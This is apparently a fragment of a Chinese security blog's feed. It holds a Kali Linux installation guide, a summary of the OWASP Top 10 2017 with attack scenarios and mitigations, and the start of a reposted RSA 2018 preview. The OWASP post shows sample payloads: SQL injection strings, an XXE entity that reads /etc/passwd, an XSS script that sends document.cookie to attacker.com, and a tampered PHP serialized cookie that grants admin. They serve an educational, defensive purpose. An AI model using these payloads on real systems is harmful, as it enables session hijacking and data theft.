    <content type="html"><![CDATA[<p><strong>0x1 概况</strong></p><p>Kali Linux 是一个开源版的基于 Debian 的 Linux 发行版，由 Offensive Security Ltd 维护和资助。Kali Linux 预装有超过 600 个预装的渗透测程序，例如：</p><ul><li>Metasploit Framework（国际知名安全框架，为渗透测试师提供了大量的渗透测试模块和扫描模块）</li><li><a href="https://nmap.org/man/zh/index.html" target="_blank" rel="noopener">Nmap</a>（一款开放源代码的 网络探测和安全审核的工具）</li><li>Aircrack-ng（一个与802.11标准的无线网络分析有关的安全软件）</li><li>Burp suite（用于攻击web 应用程序的集成平台）</li><li>Wireshark（一个免费开源的网络数据包分析软件）</li><li>…</li></ul><p>Kali Linux 默认设置为单用户 root 账户登陆。</p><blockquote><p>Offensive Security 是一家提供世界级信息安全培训和渗透测试服务的提供商，除了 Kali Linux 之外，Offensive Securiy 也开源维护了渗透攻击模块库（<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit Database</a>）和免费的在线课程 <a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener">Metasploit Unleashed</a></p></blockquote><p><strong>0x2 安装</strong></p><p>这里推荐使用 VMware 或 VirtualBox 虚拟机安装 Kali Linux；</p><ol><li><p>笔者使用的是 VMware Workstation，下载时选择 <strong>Kali Linux 64 bit VMware VM</strong> ；</p><p><img src="https://cl.ly/1W1h170a333C/%E4%B8%8B%E8%BD%BD%20Kali%20Linux%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6.png" alt=""></p></li><li><p>下载完成后得到 <strong>kali-linux-2018.1-vm-amd64.7z</strong> ，然后解压缩；（温馨提示，下载完成后，一定要用 sha256sum 校验 SHA256 验证码，保证系统完整性和安全性 ！！！）</p></li><li><p>打开解压缩包文件夹，找到以 “vmx” 结尾的 Kali-Linux-2018.1-vm-amd64.<strong>vmx</strong>（VMware 虚拟机配置文件） ，右键选择 “使用 Vmware Workstation 打开”；</p><p><img src="https://cl.ly/3t2K2s040P37/%E6%89%93%E5%BC%80%20Kali%20Linux%20vmx%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt=""></p></li><li><p>一步步安装好后，登陆是账户名称 <strong>root</strong> ，密码可以设为 toor （Kali Linux 强制为单用户 root 登陆，方便进行渗透测试）</p></li></ol><p>系统运行如下图</p><p><img src="https://cl.ly/2Q3Y2h2D0O1u/Kali%20Linux%20%E4%B8%BB%E7%95%8C%E9%9D%A2.png" alt=""></p><blockquote><p>不得不说，Kali Linux更新很快，4.29 下载还是 2018.1 版本，现在打开官网已经是 2018.2 版本了，为 Offensive Security  团队的敬业、效率打 call 📱</p></blockquote><p><strong>0x3 总结</strong></p><ul><li>Kali Linux 免费开源</li><li>Kali Linux 采用单用户 root 登陆方式</li></ul><p><strong>0x4 附录</strong></p><ol><li><a href="https://www.kali.org/" target="_blank" rel="noopener">Kali Linux 官网</a></li><li><a href="http://www.kalitutorials.net/" target="_blank" rel="noopener">Kali Linux Tutorial</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;0x1 概况&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Kali Linux 是一个开源版的基于 Debian 的 Linux 发行版，由 Offensive Security Ltd 维护和资助。Kali Linux 预装有超过 600 个预装的渗透测程序，例如：&lt;
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Kali Linux" scheme="https://github.com/zhililab/tags/Kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP 10 - 2017 Part 2</title>
    <link href="https://github.com/zhililab/2018/04/18/OWASP-Top10-2017-Part2/"/>
    <id>https://github.com/zhililab/2018/04/18/OWASP-Top10-2017-Part2/</id>
    <published>2018-04-18T02:26:35.000Z</published>
    <updated>2018-06-04T05:05:06.991Z</updated>
    
    <content type="html"><![CDATA[<p>【OWASP TOP 10 - 2017 】<a href="http://www.zhililab.com/2018/04/13/OWASP-Top10-2017/" target="_blank" rel="noopener">Part 1 OWASP Top 10 - 2017 报告概览</a><br>【OWASP TOP 10 - 2017 】<a href="http://www.zhililab.com/2018/04/18/OWASP-Top10-2017-Part2/" target="_blank" rel="noopener">Part 2 OWASP Top 10 安全威胁深度了解</a></p><p>上次我们介绍了OWASP组织、应用安全威胁相关内容、Top 10 风险内容，这次我们将会介绍 Top 10 安全威胁的<strong>常见攻击示例</strong>以及<strong>防范措施</strong>等内容，下面我们将按照 Top 1 - 10 的顺序依次展开 。</p><h3 id="A1-2017-Injection"><a href="#A1-2017-Injection" class="headerlink" title="A1: 2017 Injection"></a><strong>A1: 2017 Injection</strong></h3><p><strong>0x1 产生背景</strong></p><ul><li>应用未验证、过滤或净化用户来源数据</li><li>网页解释器直接使用没有内容感知动态查询或不含参调用</li><li>在 ORM 搜索参数包含恶意数据去抽取查询之外的、敏感数据</li><li>…</li></ul><blockquote><p>当应用程序容易被注入攻击时，源代码审查是最好的检测方法。</p></blockquote><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong> </p><p>下面例子中，在SQL查询访问构造过程中使用了非可信数据:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String query = <span class="string">"SELECT * FROM accounts WHERE custID='"</span> + request.getParameter(<span class="string">"id"</span>) + <span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p><strong>场景 #2</strong></p><p>类似的，应用对<strong>框架</strong>的盲目”信任“可能导致查询语句的脆弱(e.g Hibernate Query Language(HQL)):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Query HQLQuery = session.createQuery(<span class="string">"FROM accounts WHERE custID='"</span> + request.getParameter(<span class="string">"id"</span>) + <span class="string">"'"</span>);</span><br></pre></td></tr></table></figure><p><strong>0x3 防范措施</strong></p><p>防范注入攻击需要把数据与命令、查询分离开，以下是常见防范措施:</p><ul><li>优先选择是<strong>使用更安全的 API</strong></li><li>可以在<strong>服务器端</strong>使用<strong>正向或“白名单”</strong>输入验证</li><li>在查询中使用<strong>LIMIT 和其他 SQL 控制</strong>，防止 SQL 注入攻击</li><li>…</li></ul><h3 id="A2-2017-Broken-Authentication"><a href="#A2-2017-Broken-Authentication" class="headerlink" title="A2: 2017-Broken Authentication"></a><strong>A2: 2017-Broken Authentication</strong></h3><p><strong>0x1 产生背景</strong></p><p>当应用出现以下情况会造成认证削弱:</p><ul><li>应用允许自动攻击，例如证书填充攻击 (攻击者拥有一系列的有效用户名和密码)</li><li>应用使用脆弱的或无效的证书恢复机制或忘记密码流程，例如“基于问答的密码找回方式”</li><li>使用明文，加密或若哈希的密码</li><li>…</li></ul><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong> </p><p>证书填充——使用一系列已知密码——是一种常见的攻击手段。</p><p><strong>场景 #2</strong></p><p>大部分认证攻击攻击是由于单一机制的密码的使用造成的。</p><p><strong>场景 #3</strong></p><p>应用会话超时设置不正确。</p><p><strong>0x3 防范措施</strong></p><p>尽可能的采取多重认证机制，从而免于自动化、证书填充攻击和偷窃证书复用等攻击，具体措施如下:</p><ul><li>不使用任何默认证书传输或部署，<strong>尤其是管理员</strong></li><li>采用弱密码检查机制，例如测试新用户密码或修改后的密码是否属于 Top 10000 worst passwords</li><li>限制或逐渐延缓失败登陆尝试</li><li>…</li></ul><h3 id="A3-2017-Sensitive-Data-Exposure"><a href="#A3-2017-Sensitive-Data-Exposure" class="headerlink" title="A3: 2017-Sensitive Data Exposure"></a><strong>A3: 2017-Sensitive Data Exposure</strong></h3><p><strong>0x1 产生背景</strong></p><p>为了验证网络应用是否存在敏感数据暴漏漏斗，首先要做的是判定数据在传输和驻留阶段的保护级别需求。比如对于密码、信用卡账号、健康数据、个人信息和商业秘密需求额外的比如，<strong>尤其是数据被划归到隐私保护法规下面 （e.g. 欧盟通用数据保护监管法GDPR）</strong>等，对于这些数据，需要考虑：</p><ul><li>数据是否存在明文传输？这关系到如 HTTP，SMTP 和 FTP 协议</li><li>敏感数据是否存在明文存储，包括备份数据</li><li>代码中是否使用任何过时的或容易破解的密码算法？</li><li>…</li></ul><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong> </p><p>数据库中的信用卡账号使自动数据库加密机制。这意味检索数据时信用卡数据会自动解密，这将造成 SQL  注入可以获取信用卡帐号的明文内容。</p><p><strong>场景 #2</strong></p><p>① 网站站点未使用或增强 TLS 加强安全保护  ② 站点仅支持易破解的加密机制。这时，攻击者通过监控网络流量，把网站协议从 HTTPS 降为 HTTP，捕获请求，然后窃取用户会话 cookie。接下来，攻击者可以使用这个 cookie ，劫持认证的会话 —— 获取或修改用户的隐私数据。</p><blockquote><p><strong>Cookie</strong>（复数形态Cookies），中文名称为“小型文字档案”或“小甜饼”<a href="https://www.wikiwand.com/zh-hans/Cookie#citenote1" target="_blank" rel="noopener">[1]</a>，指某些<a href="https://www.wikiwand.com/zh-hans/%E7%BD%91%E7%AB%99" target="_blank" rel="noopener">网站</a>为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过<a href="https://www.wikiwand.com/zh-hans/%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">加密</a>）via Wikipedia</p></blockquote><p><strong>场景 #3</strong></p><p>存储密码的数据库使用未处理的或简单哈希存储每个人密码。一个简单的文件上传漏洞将使攻击者可以获取<strong>整个密码数据库</strong>。</p><p><strong>0x3 防范措施</strong></p><ul><li>对应用程序使用的数据进行分类：使用的、存储的或传输的</li><li>上述数据分类时，使用控制机制</li><li>非必要时，不使用敏感数据</li><li>…</li></ul><h3 id="A4-2017-XML-External-Entities"><a href="#A4-2017-XML-External-Entities" class="headerlink" title="A4: 2017-XML External Entities"></a><strong>A4: 2017-XML External Entities</strong></h3><p><strong>0x1 产生背景</strong></p><p>下列情况发生时，应用程序尤其是基于 XML 网络服务或下游集成容易受到攻击:</p><ul><li>应用程序直接接收 XML 或者 XML 上传，<strong>尤其是来自非信赖来源的 XML，或者是往 XML 文档中插入 非可信数据（XML 处理器负责解析）</strong></li><li>当应用程序或基于 SOAP 的网页服务 XML 处理启用 DTDs(document type definitions)时</li><li>在需要联合安全和单点登录登陆时，应用程序使用 SAML 进行身份处理操作</li><li>…</li></ul><blockquote><p>安全断言标记语言（英语：Security Assertion Markup Language，简称<strong>SAML</strong>，发音sam-el）是一个基于XML的开源标准数据格式，它在当事方之间交换身份验证和授权数据，尤其是在身份提供者和服务提供者之间交换。 <strong>SAML</strong>是OASIS安全服务技术委员会的一个产品，始于2001年。 via Wikipedia</p></blockquote><p><strong>0x2 攻击场景</strong></p><p>当下，已经发现了大量公开 XXE 问题，包括攻击嵌入式设备。XEE 攻击发生很多意想不到的地方，其中包括 <strong>deeply nested dependencies</strong>。</p><p><strong>场景 #1</strong></p><p>攻击者尝试从服务器端提取数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>场景 #2</strong></p><p>攻击者通过把 ENTITY所在行以上修改为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">https:</span>//<span class="attr">192.168.1.1</span>/<span class="attr">private</span>" &gt;</span>]&gt;</span><br></pre></td></tr></table></figure><p><strong>场景 #3</strong></p><p>攻击者通过包括潜在无结束文件方式发起服务拒绝攻击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">dev</span>/<span class="attr">random</span>" &gt;</span>]&gt;</span><br></pre></td></tr></table></figure><p><strong>0x3 防范措施</strong></p><p>培训开发者是识别和减轻 XXE 攻击的有效方法，除此之外，预防还需要以下措施:</p><ul><li>尽可能使用相较不复杂的数据格式（e.g. JSON），并且避免序列化敏感数据</li><li>给所有应用程序或潜在操作系统使用的 XML 处理器和库打补丁或升级操作</li><li>在应用程序中，所有 XML 解析器禁用 XML 外部实体和 DTD 操作</li><li>…</li></ul><h3 id="A5-2017-Broken-Access-Control"><a href="#A5-2017-Broken-Access-Control" class="headerlink" title="A5: 2017-Broken Access Control"></a><strong>A5: 2017-Broken Access Control</strong></h3><p><strong>0x1 产生背景</strong></p><p>访问控制实施一系列策略，例如用户不能进行超出授权范围之外的操作。访问控制失败通常意味着非授权信息披露、所有数据的修改或破话，<strong>甚至进行用户限制之外的商业操作</strong>。常见的访问控制漏洞造成原因包括：</p><ul><li>通过修改URL、内部应用状态或 HTML 页面，甚至单纯使用一个自定义 API 攻击工具的方式，攻击者可以绕过访问控制检查</li><li>允许修改其他用户记录的主码，这会导致攻击者可以浏览或修改其他人的账号</li><li>错误的 CORS 配置造成非授权 API 访问</li><li>…</li></ul><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong></p><p>应用程序使用访问账户信息的未经验证的 SQL 语句:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pstmt.setString(<span class="number">1</span>, request.getParameter(<span class="string">"acct"</span>)); </span><br><span class="line">ResultSet results = pstmt.executeQuery( );</span><br></pre></td></tr></table></figure><p>攻击者单纯通过修改浏览器 acct 参数达到获取任何想要账号信息的目的。如果验证不当，攻击者（理论上）可以访问任意用户的账号信息（PS：细思极恐呀 ヽ(*。&gt;Д&lt;)o゜）。</p><p><strong>场景 #2</strong></p><p>攻击者迫使浏览器定位（特定的） URLs。例如，访问管理员页面需要管理员权限。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/app/getappInfo </span><br><span class="line">http://example.com/app/admin_getappInfo</span><br></pre></td></tr></table></figure><p>如果未经授权的用户可以访问任意页面，这是一种漏洞。再如果非管理员可以访问管理员页面，也是一个漏洞。</p><blockquote><p>这里查找资料发现简单的网站后台登陆一般采用如下渠道：<br>    <a href="http://www.site.com/admin" target="_blank" rel="noopener">www.site.com/admin</a><br>    <a href="http://www.site.com/administrator" target="_blank" rel="noopener">www.site.com/administrator</a><br>    <a href="http://www.site.com/login" target="_blank" rel="noopener">www.site.com/login</a><br>    <a href="http://www.site.com/wp-login.php" target="_blank" rel="noopener">www.site.com/wp-login.php</a><br>    <a href="http://www.site.com/admin.php" target="_blank" rel="noopener">www.site.com/admin.php</a></p></blockquote><p><strong>0x3 防范措施</strong></p><p>为了防范访问控制机制破损，可以采取以下措施：</p><ul><li>除了公共资源之外，其他资源的访问设置成默认拒绝</li><li>禁用网页服务器目录列表功能并且确保文件元数据（e.g. git）和备份文件没有显露在 web roots 目录下</li><li>限制 API 和控制器访问频率，最小化招到自动攻击工具的损害</li><li>…</li></ul><h3 id="A6-2017-Security-Misconfiguration"><a href="#A6-2017-Security-Misconfiguration" class="headerlink" title="A6: 2017-Security Misconfiguration"></a><strong>A6: 2017-Security Misconfiguration</strong></h3><p><strong>0x1 产生背景</strong></p><p>当应用程序出现下列情况时，应用程序容易受到攻击：</p><ul><li>应用程序栈的任意部分缺失合理安全加强配置或者云服务配置了不当的允许权限</li><li>启用或安装了不需要的特性</li><li>启用并且未修改默认账户和密码</li><li>…</li></ul><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong></p><p>服务器端没有禁用目录列表功能（directory listing）。在这种情况下，攻击者可以轻而易举的发现服务器目录。接着找到并下载编译好的 Java 类，从而通过逆向工程手段查看源代码。最后，攻击者就可以找到应用程序中存在的严重访问控制漏洞。</p><p><strong>场景 #2</strong></p><p>应用程序服务器配置允许返回用户详细的错误信息，例如栈追溯等。这有可能会暴露敏感信息或潜在漏洞（如已经存在漏洞的组建版本信息）。</p><p><strong>场景 #3</strong></p><p>云服务提供商（CSP，cloud service provider）默认开启了共享允许权限，其他 CSP 用户可以访问。这会导致（攻击者）可以读取存储在云存储中的敏感数据。</p><p><strong>0x3 防范措施</strong></p><p>应该实施包括以下措施在内的安全安装流程：</p><ul><li>一个可重复操作的（安全）加固流程可以加速整个进程，方便部署到其他合理锁住的环境</li><li>打造一个最小化的平台，去除其他任何不需要的特性、组件、文档和示例。移除或不安装任何未使用的特性和框架</li></ul><blockquote><p>这里我突然想起以前使用 Visual Studio 的时候，每次写完一个程序文件，VS 都会自动提示存在哪些未使用的组件或框架，建议单击一键删除，我想原因不单单是我想的节省代码空间，更重要的是本条防范攻击措施所提到的移除或不安装任何未使用的特性和框架，最小化存在组件或框架配置不当造成安全漏洞的可能性。</p></blockquote><ul><li>制定一个验证所有环境中配置和设置安全有效性的自动化流程</li><li>…</li></ul><h3 id="A7-2017-Cross-Site-Scripting-XSS"><a href="#A7-2017-Cross-Site-Scripting-XSS" class="headerlink" title="A7: 2017-Cross-Site Scripting (XSS)"></a><strong>A7: 2017-Cross-Site Scripting (XSS)</strong></h3><p><strong>0x1 产生背景</strong></p><p>当下针对用户浏览器，有三种形式的 XSS 攻击：</p><ul><li>反射 XSS（Reflected XSS）</li><li>存储 XSS（Stored XSS）</li><li>文档对象模型 XSS（DOM XSS）</li></ul><p>典型的 XSS 攻击包括会话偷窃、账户接管、MFA 忽略、DOM 节点替换或损坏以及针对用户浏览器的恶意软件下载、键盘记录或其他客户端攻击。</p><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong></p><p>在以下 HTML 代码块构建过程中，应用程序未经验证就使用了非可信数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(String) page += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'creditcard'</span> <span class="attr">type</span>=<span class="string">'TEXT'</span> <span class="attr">value</span>=<span class="string">'" + request.getParameter("CC") + "'</span>&gt;</span>";</span><br></pre></td></tr></table></figure><p>攻击者把浏览器的 ‘CC’ 参数修改为如下形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi?</span></span><br><span class="line"><span class="undefined">foo='+document.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>'.</span><br></pre></td></tr></table></figure><p>这种攻击可以导致受害者会话 ID（session ID）发送到攻击者网站，使得攻击者能够劫持用户的当前会话（current session）。</p><p><strong>提示：</strong>攻击者可以使用 XSS 破坏任何可能部署的自动化跨站点请求伪造（CSRF）。</p><p><strong>0x3 防范措施</strong></p><p>防范 XSS 攻击者需要将非可信数据与活跃浏览器内容分离，措施包括：</p><ul><li>使用设计之初带有自动化 XSS 逃逸功能的框架，例如最新版的 Ruby on Rails，React JS</li><li>基于 HTML 输出的上下文，逃避任何不受信任的 HTTP 请求数据可以解决反射和存储 XSS 漏洞</li><li>…</li></ul><h3 id="A8-2017-Insecure-Deserialization"><a href="#A8-2017-Insecure-Deserialization" class="headerlink" title="A8: 2017-Insecure Deserialization"></a><strong>A8: 2017-Insecure Deserialization</strong></h3><p><strong>0x1 产生背景</strong></p><p>如果应用程序和 API 对攻击者发送的恶意或篡改后的对象进行反序列化操作，那么将会受到相应攻击，一般来说攻击主要有以下两种类型：</p><ul><li>当存在应用程序可用类能够在反序列化时或在反序列化之后改变行为的情况下，攻击者修改应用程序逻辑或实现任意远程代码执行的方式攻击相关对象或数据结构</li><li>典型的数据篡改攻击，例如访问控制相关攻击（使用现有的但内容被改变的数据结构）</li></ul><p>序列化可以用在应用的如下场景中：</p><ul><li>远程和内部进行通信（RPC/IPC）</li><li>无限协议、网络服务、消息代理</li><li>缓存/持久化</li><li>…</li></ul><blockquote><p>对于使用 Python 3.X 的小伙伴，官方文档明确提示：</p><p><strong>Warning：</strong>The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source. （警告：永远不要对<strong>非可信来源</strong>或<strong>非认证</strong>来源数据进行反序列化操作）</p></blockquote><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong></p><p>React 应用访问一系列 Spring Boot 微服务。作为程序员，他们尝试确保代码不可更改。他们想出的方案时序列化用户状态并传递给每个前后请求。攻击者注意到 “R00” Java 对象签名，然后使用 Java 序列杀手（JAVA Serial Killer）工具在服务器端获得远程代码执行权限。</p><p><strong>场景 #2</strong></p><p>一个 PHP 论坛用户使用 PHP 对象序列化来保存 “super” cookie，这个cookie 包含有用户 ID、角色、密码哈希值和其他状态：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;i:<span class="number">0</span>;i:<span class="number">132</span>;i:<span class="number">1</span>;s:<span class="number">7</span>:<span class="string">"Mallory"</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">"user"</span>; i:<span class="number">3</span>;s:<span class="number">32</span>:<span class="string">"b6a8b3bea87fe0e05022f8f3c88bc960"</span>;&#125;</span><br></pre></td></tr></table></figure><p>攻击者改变序列化对象是他们可以获得管理员权限：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;i:<span class="number">0</span>;i:<span class="number">1</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"Alice"</span>;i:<span class="number">2</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>; i:<span class="number">3</span>;s:<span class="number">32</span>:<span class="string">"b6a8b3bea87fe0e05022f8f3c88bc960"</span>;&#125;</span><br></pre></td></tr></table></figure><p><strong>0x3 防范措施</strong></p><p>唯一安全架构模式——不接受来自非可信来源的序列化对象或者使用仅接受原始数据类型的序列化媒介。如果做不到这点，可以考虑以下措施：</p><ul><li>实施完整性检查，例如每个序列化对象的数字签名，防止恶意对象创建或数据篡改</li><li>监测反序列化操作，如果用户经常反序列化就发送警报</li><li>尽可能的在低权限的环境中隔离运行反序列化代码</li><li>…</li></ul><h3 id="A9-2017-Using-Components-with-Known-Vulnerabilities"><a href="#A9-2017-Using-Components-with-Known-Vulnerabilities" class="headerlink" title="A9: 2017-Using Components with Known Vulnerabilities"></a><strong>A9: 2017-Using Components with Known Vulnerabilities</strong></h3><p><strong>0x1 产生背景</strong></p><p>如果出现以下情况，你的应用可能存在相关威胁风险：</p><ul><li>不了解所有组件的版本（包括客户端和服务器端）</li><li>使用的软件有漏洞、不受安全支持或是过期的</li><li>没有定期扫描漏洞，未订阅使用组件的安全公告</li><li>…</li></ul><p><strong>0x2 攻击场景</strong></p><p> <strong>场景 #1</strong></p><p>因为组件通常在运行时和应用程序有相同的权限，因此一旦任意组件存在漏洞就可以导致严重影响。这些漏洞可能时偶然出现的（例如编写代码错误）或是有意而为之（例如组件的“后门”）下面时已被发现的存在挖掘组件漏洞风险的例子：</p><ul><li>CVE-2017-5638，Struts 2 远程代码执行漏洞可以导致服务器端任意代码的执行</li><li>由于 IoT 设备很难甚至几乎不可能打补丁修复，修复它们的漏洞的重要性就可想而知了（例如生物医学设备）</li></ul><p>当下，已有一些自动化工具可以帮助攻击者发现未打补丁或存在错误配置的系统。</p><p><strong>0x3 防范措施</strong></p><p>完备补丁管理流程：</p><ul><li>移除未使用的 dependencies 、不需要的特性、组件、文件和文档</li><li>仅从安全链接获取官方版本的组件</li><li>监测不再维护或不在更新老版本安全补丁的库和组件。</li><li>…</li></ul><h3 id="A10-2017-Insufficient-Logging-amp-Monitoring"><a href="#A10-2017-Insufficient-Logging-amp-Monitoring" class="headerlink" title="A10: 2017-Insufficient Logging &amp; Monitoring"></a><strong>A10: 2017-Insufficient Logging &amp; Monitoring</strong></h3><p><strong>0x1 产生背景</strong></p><p>不足日志记录、检测、监控和活跃响应可能发现在任何时间：</p><ul><li>未记录审计事件，例如登陆、失败登陆和高金额的交易</li><li>警告和错误未生成、不充分或不清晰的日志消息</li><li>应用程序和 API 日历没有监控可疑活动</li><li>…</li></ul><p>如果你使得日志和警报事件对用户或攻击者可见，那么你存在信息泄露的风险。</p><p><strong>0x2 攻击场景</strong></p><p><strong>场景 #1</strong></p><p>由一小型团队运作的开源论文软件通过软件漏洞被黑了。攻击者清楚了包含下个版本信息的内部源代码库和所有的论坛内容。虽然可以恢复源代码，但缺乏监控、日志记录或入侵预警导致了更加严重的事故。<strong>这个事件的结果是论坛软件逐渐淡出人们视野，用户不再使用</strong>。</p><p><strong>场景 #2</strong></p><p>攻击者使用常见密码进行账号扫描。他们可以接管所有使用这个密码的账号。对于其他用户，这仅仅留下一个错误登陆记录。过了些天后，攻击者可能会使用不同的密码进行类似的操作。</p><blockquote><p>评述：这个攻击场景中，日志监控系统未能发挥有效作用，识别恶意撞库攻击，采取响应措施，“纵容恶意攻击事件的再次发生”！</p></blockquote><p><strong>0x3 防范措施</strong></p><p>对于应用程序存储数据获取处理数据中风险，需要采取以下措施加强防范：</p><ul><li>确保充分记录所有搜有登陆、访问控制失败和服务器端输入验证失败，并且配置足够的上下文信息，去识别可疑或恶意账号，维持充足的时间以备接下来的取证分析。</li><li>确保日志生成格式可以被中央日志管理解决方案接受归并</li><li>确保所有高金额交易有一个完整性控制审计记录，以防止记录篡改或删除</li><li>…</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次我们介绍了 Top 10 安全威胁的<strong>常见攻击场景</strong>、<strong>攻击场景</strong>和<strong>防范措施</strong>等内容，通过这篇文章可以对 OWASP Top 10 - 2017  十大最严重网络应用安全威胁的产生背景、攻击场景、如何做好防范措施有个大致的了解 ~</p><p>附录：这里附上 OWASP Top 10 - 2017 报告中英文版链接，但还是建议大家首选英文版阅读，或者中英文对照阅读，个人阅读中文版发现其中有一些地方翻译欠妥，容易造成理解困难 ~</p><ol><li><a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf" target="_blank" rel="noopener">OWASP Top 10 - 2017 报告英文版</a></li><li><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf" target="_blank" rel="noopener">OWASP Top 10 - 2017 报告中文版</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;【OWASP TOP 10 - 2017 】&lt;a href=&quot;http://www.zhililab.com/2018/04/13/OWASP-Top10-2017/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Part 1 OWASP Top 10 -
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="OWASP" scheme="https://github.com/zhililab/tags/OWASP/"/>
    
  </entry>
  
  <entry>
    <title>【转载】RSA 2018大会前瞻：热点议题与CISO的关注重点</title>
    <link href="https://github.com/zhililab/2018/04/15/RSA-2018/"/>
    <id>https://github.com/zhililab/2018/04/15/RSA-2018/</id>
    <published>2018-04-15T06:51:57.000Z</published>
    <updated>2018-06-04T07:13:01.690Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一年一度的 RSA 大会（美国信息安全大会）将于当地时间 4 月 16 日到 4 月 20 日在美国旧金山举行。作为圈内影响力较大的会议，RSA 每年的议题和环节都有值得关注的亮点。今年预计有 500 家安全厂商参展，而参会者将有望突破 4 万人。其中，有很大一部分是安全行业从业者以及安全高管，他们的意见和经验也颇有参考价值。</p></blockquote><p><strong>今年 RSA 大会的主题是“Now Matters”，主页列出了将近 20 个主要议题</strong>。与 DEF CON 与 BlackHat 的纯技术议题相比，RSA 的议题更加多样化，受众范围也更广。总体来看，有围绕密码学的专家讨论会、有美国国土安全部部长关于网络安全战略以及对抗网络攻击、数据泄露和网络犯罪等恶意行为的措施、也有安全研究专家对新型攻击技术与未来趋势的探讨。当然，还有目前大热的区块链、人工智能、物联网安全、网络安全法规、企业安全建设、网络战争等相关的议题，甚至还有网红、畅销书作家和优秀女性从业者等来讲解心理建设、成功学等相关的内容，这让 RSA 大会在高科技之余，多了一些人文气息。</p><p><img src="http://image.3001.net/images/20180413/15236075098279.jpg" alt=""></p><p>参考 RSA 大会的安全专家、高级内容经理 Britta Glade 的观点，今年 RSA 大会的议题折射出 2018 年网络安全的几大热点趋势：<strong>人工智能</strong>、<strong>人为操纵与人的因素</strong>、<strong>ICS 与供应链攻击</strong>、<strong>物联网与医疗设备</strong>、<strong>情报共享</strong>、<strong>身份</strong>、<strong>基础设施</strong>、<strong>GDPR</strong>、<strong>风险管理与恢复能力</strong>等。</p><h3 id="有什么新创意"><a href="#有什么新创意" class="headerlink" title="有什么新创意"></a>有什么新创意</h3><p><strong>一大亮点是 Broadcast Alley，相当于 RSAC 2018 的“非官方新闻室”</strong>。出版商，赞助商，合作伙伴和参展商可以在 Broadcast Alley 